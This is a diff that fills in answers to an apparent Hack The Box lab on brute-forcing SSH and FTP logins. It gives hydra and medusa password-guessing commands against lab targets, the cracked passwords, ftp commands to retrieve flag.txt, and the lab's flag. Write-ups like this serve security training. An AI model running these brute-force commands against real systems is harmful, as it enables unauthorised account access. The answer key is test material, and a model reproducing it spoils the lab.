@@ -149,8 +149,16 @@ The ease with which such attacks can be executed underscores the importance of e
 
 What was the password for the ftpuser?
 
-* 
+* Run command " hydra -l sshuser -P 2023-200_most_used_passwords.txt \<ip given> ssh -s \<port given> " so you will get a success message with the password " 1q2w3e4r5t "
+* Use the username and password to access thru ssh to the attacked server, once you are on the home folder of sshuser, do an " ls " command to check for files on the folder, you will find a list of passwords you can use for the next attack
+* Run command " medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp " ( the ip being the local host and the list of passwords the ones that were already on the folder ) and you will get a successful message for the password
+* qqww1122
+
 
 After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?
 
-* 
+* Once you have the user and password to access the FTP service, run the command " ftp ftp://ftpuser:qqww1122@localhost "
+* Once inside the service, do an " ls " command and you will find the flag file
+* Download the file by running the command " get flag.txt " and then exit the FTP service
+* Look for the flag file on the folder where you did the medusa attack and open it
+* HTB{SSH_and_FTP_Bruteforce_Success}
